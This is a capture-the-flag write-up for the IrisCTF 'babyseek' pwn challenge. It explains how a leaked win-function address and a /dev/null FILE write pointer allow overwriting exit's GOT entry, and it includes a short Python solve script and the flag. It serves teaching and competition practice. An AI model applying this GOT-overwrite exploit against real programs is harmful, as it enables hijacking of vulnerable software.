# babyseek (Binary Exploitation)
> I'll let you seek around my file as far as you want, but you can't go anywhere since it's /dev/null.

This is a slightly-more-than-baby baby pwn challenge. The binary is compiled with RELRO turned off because it's small enough that it gets full RELRO by default. It has other default protections enabled.

The challenge leaks the pointer to a `win` function which prints the flag...
```c
    printf("Your flag is located around %p.\n", win);
```
...and a pointer claiming to be into `/dev/null`.
```c
    printf("I'm currently at %p.\n", null->_IO_write_ptr);
```
The second pointer is a really pointer that points to the `_IO_write_ptr` member of a `FILE` object. This pointer actually controllers where writing to the file will attempt to write to in memory. Normally, this is a buffer holding the data to write to the file that gets flushed occasionally, which is allocated on the heap.

It takes an offset, adds it to the `_IO_write_ptr`, and then tries to write the address of the win() function to that offset, and then exit()s.
```c
    printf("Where should I seek into? ");
    scanf("%d", &pos);
    null->_IO_write_ptr += pos;

    fwrite(&super_special, sizeof(void*), 1, null); // super_special is a pointer to win
    exit(0);
```

We can exploit this program by changing the place where the pointer lands to an area of memory where a function pointer lands. One such place is the [Global Offset Table (GOT)](url), which is at a constant offset from the win function! If we set the pointer so it overwrites an useful member of the GOT, we can have the program call the win function. One easy target is `exit`, which is called write after.

We can just compute the constant offset from win to `exit@.got.plt` using gdb and then send an appropriate offset based on the two leaks.
```py
off = 8767
r.recvuntil(b"Your flag is located around ")
flag = eval(r.recvuntil(b".", drop=True).decode())
r.recvuntil(b"I'm currently at ")
loc = eval(r.recvuntil(b".", drop=True).decode())
send = flag - loc + off
r.sendline(str(send).encode())
```

```
irisctf{not_quite_fseek}
```
